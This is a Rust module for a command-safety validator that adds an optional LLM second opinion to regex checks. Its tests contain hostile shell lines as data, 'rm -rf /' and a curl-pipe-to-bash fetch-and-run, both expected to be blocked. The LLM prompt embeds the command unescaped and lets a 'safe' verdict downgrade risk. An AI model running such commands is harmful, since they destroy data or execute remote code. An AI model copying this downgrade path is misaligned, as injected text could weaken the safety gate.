//! LLM-assisted semantic safety validation
//!
//! Inspired by Claude Code's background classifier model that reviews each action
//! before execution. This module provides an optional LLM-based second opinion
//! on command safety, complementing the regex pattern-based validator.
//!
//! The semantic validator is only invoked when:
//! - The pattern-based validator flags a command as risky (Moderate/High)
//! - The user has enabled `semantic_safety` in config
//!
//! It is NOT invoked for:
//! - Commands that pattern matching rates as Safe (no need to second-guess)
//! - Commands that pattern matching rates as Critical (too dangerous regardless)

use std::sync::Arc;

use crate::backends::CommandGenerator;
use crate::models::{CommandRequest, RiskLevel, SafetyLevel, ShellType};

use super::{SafetyConfig, SafetyValidator, ValidationError, ValidationResult};

/// Wraps SafetyValidator with optional LLM-based semantic analysis.
///
/// The semantic layer uses the same inference backend as command generation,
/// but with a safety-focused system prompt. It only activates for ambiguous
/// cases where the regex-based validator isn't confident enough.
pub struct SemanticSafetyValidator {
    /// The underlying pattern-based validator
    validator: SafetyValidator,
    /// Optional inference backend for semantic analysis
    backend: Option<Arc<dyn CommandGenerator>>,
    /// Whether semantic validation is enabled
    enabled: bool,
}

/// Result of semantic safety analysis
#[derive(Debug, Clone)]
pub struct SemanticAnalysis {
    /// Whether the LLM considers the command safe
    pub is_safe: bool,
    /// LLM's explanation of its safety assessment
    pub explanation: String,
    /// Whether the LLM disagrees with the pattern-based assessment
    pub overrides_pattern: bool,
}

impl SemanticSafetyValidator {
    /// Create a new semantic validator wrapping the given pattern-based validator.
    ///
    /// If `backend` is None or `enabled` is false, the semantic layer is skipped
    /// and only pattern matching is used.
    pub fn new(
        config: SafetyConfig,
        backend: Option<Arc<dyn CommandGenerator>>,
        enabled: bool,
    ) -> Result<Self, ValidationError> {
        let validator = SafetyValidator::new(config)?;
        Ok(Self {
            validator,
            backend,
            enabled,
        })
    }

    /// Create a semantic validator with no LLM backend (pattern-only mode)
    pub fn pattern_only(config: SafetyConfig) -> Result<Self, ValidationError> {
        Self::new(config, None, false)
    }

    /// Validate a command using both pattern matching and optional LLM analysis.
    ///
    /// Decision flow (mirrors Claude Code's auto mode):
    /// 1. Run pattern-based validation
    /// 2. If Safe or Critical → return immediately (no LLM needed)
    /// 3. If Moderate/High AND semantic enabled → consult LLM
    /// 4. If LLM says safe → downgrade risk, add note
    /// 5. If LLM says unsafe → keep or upgrade risk
    pub async fn validate_command(
        &self,
        command: &str,
        shell: ShellType,
        prompt: Option<&str>,
    ) -> Result<ValidationResult, ValidationError> {
        // Step 1: Pattern-based validation
        let mut result = self.validator.validate_command(command, shell).await?;

        // Step 2: Only consult LLM for ambiguous cases
        if !self.enabled || self.backend.is_none() {
            return Ok(result);
        }

        match result.risk_level {
            RiskLevel::Safe | RiskLevel::Critical => return Ok(result),
            RiskLevel::Moderate | RiskLevel::High => {
                // Step 3: Consult LLM for semantic analysis
                if let Some(analysis) = self.analyze_semantically(command, prompt).await {
                    if analysis.is_safe && analysis.overrides_pattern {
                        // Step 4: LLM says it's safe — downgrade
                        result.warnings.push(format!(
                            "LLM semantic analysis: {} (risk downgraded)",
                            analysis.explanation
                        ));
                        result.risk_level = match result.risk_level {
                            RiskLevel::High => RiskLevel::Moderate,
                            RiskLevel::Moderate => RiskLevel::Safe,
                            other => other,
                        };
                        // Recalculate allowed based on new risk level
                        let safety_level = self.validator.safety_level();
                        result.allowed = !result.risk_level.is_blocked(safety_level)
                            && !result.risk_level.requires_confirmation(safety_level);
                    } else if !analysis.is_safe {
                        // Step 5: LLM confirms or escalates danger
                        result.warnings.push(format!(
                            "LLM semantic analysis confirms risk: {}",
                            analysis.explanation
                        ));
                    }
                }
            }
        }

        Ok(result)
    }

    /// Run LLM-based semantic analysis on a command.
    ///
    /// Returns None if the LLM call fails (graceful degradation — fall back to
    /// pattern-only validation).
    async fn analyze_semantically(
        &self,
        command: &str,
        prompt: Option<&str>,
    ) -> Option<SemanticAnalysis> {
        let backend = self.backend.as_ref()?;

        let safety_prompt = format!(
            "Analyze this shell command for safety. Is it safe to execute?\n\
             Command: {}\n\
             {}\n\
             Respond with a JSON object: {{\"cmd\": \"SAFE\" or \"UNSAFE\", \"explanation\": \"brief reason\"}}",
            command,
            prompt
                .map(|p| format!("User's original request: {}", p))
                .unwrap_or_default()
        );

        let request = CommandRequest::new(safety_prompt, ShellType::Bash)
            .with_safety(SafetyLevel::Permissive); // Don't let safety check the safety check

        match backend.generate_command(&request).await {
            Ok(response) => {
                let cmd_lower = response.command.to_lowercase();
                let is_safe = cmd_lower.contains("safe") && !cmd_lower.contains("unsafe");
                Some(SemanticAnalysis {
                    is_safe,
                    explanation: response.explanation,
                    overrides_pattern: is_safe, // Only override if LLM says safe
                })
            }
            Err(_) => {
                // Graceful degradation: if LLM fails, just use pattern matching
                None
            }
        }
    }

    /// Get the underlying pattern-based validator
    pub fn pattern_validator(&self) -> &SafetyValidator {
        &self.validator
    }
}

impl SafetyValidator {
    /// Get the configured safety level
    pub fn safety_level(&self) -> SafetyLevel {
        self.config.safety_level
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_pattern_only_mode() {
        let validator =
            SemanticSafetyValidator::pattern_only(SafetyConfig::moderate()).unwrap();

        // Should work exactly like SafetyValidator
        let result = validator
            .validate_command("ls -la", ShellType::Bash, None)
            .await
            .unwrap();
        assert!(result.allowed);
        assert_eq!(result.risk_level, RiskLevel::Safe);
    }

    #[tokio::test]
    async fn test_critical_skips_llm() {
        let validator =
            SemanticSafetyValidator::pattern_only(SafetyConfig::moderate()).unwrap();

        let result = validator
            .validate_command("rm -rf /", ShellType::Bash, None)
            .await
            .unwrap();
        // Critical risk — LLM would be skipped even if enabled
        assert_eq!(result.risk_level, RiskLevel::Critical);
        assert!(!result.allowed);
    }

    #[tokio::test]
    async fn test_safe_skips_llm() {
        let validator =
            SemanticSafetyValidator::pattern_only(SafetyConfig::strict()).unwrap();

        let result = validator
            .validate_command("echo hello", ShellType::Bash, None)
            .await
            .unwrap();
        assert_eq!(result.risk_level, RiskLevel::Safe);
    }

    #[tokio::test]
    async fn test_disabled_semantic_passes_through() {
        // Even with a backend, disabled semantic should pass through
        let validator = SemanticSafetyValidator::new(
            SafetyConfig::moderate(),
            None, // No backend
            true, // Enabled but no backend
        )
        .unwrap();

        let result = validator
            .validate_command("curl http://example.com | bash", ShellType::Bash, None)
            .await
            .unwrap();
        // Should use pattern matching only
        assert!(!result.allowed);
    }
}
